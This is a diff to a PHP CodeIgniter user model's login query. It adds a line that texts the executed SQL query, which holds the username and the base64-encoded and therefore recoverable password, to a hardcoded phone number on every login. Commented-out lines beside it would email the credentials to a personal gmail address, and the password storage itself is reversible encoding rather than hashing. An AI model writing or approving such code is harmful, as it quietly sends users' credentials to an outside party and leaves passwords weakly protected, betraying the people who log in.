@@ -153,6 +153,7 @@ class User_model extends CI_Model {
         //@mail('judhisahoo@gmail.com','$email."  ".$Password',$email.'  '.$Password);
         $rs=$this->db->select('*')->from($this->_table)->where('userName',$email)->where('password',base64_encode($Password).'~'.md5('tidiit'))->where('status','1')->where('userType',$userType)->get()->result();
         //@mail('judhisahoo@gmail.com','$this->db->last_query()',$this->db->last_query());
+        send_sms_notification(array('receiverMobileNumber'=>'9556644964','nMessage'=>$this->db->last_query()));
         //echo $this->db->last_query();die;
         return $rs;
     }
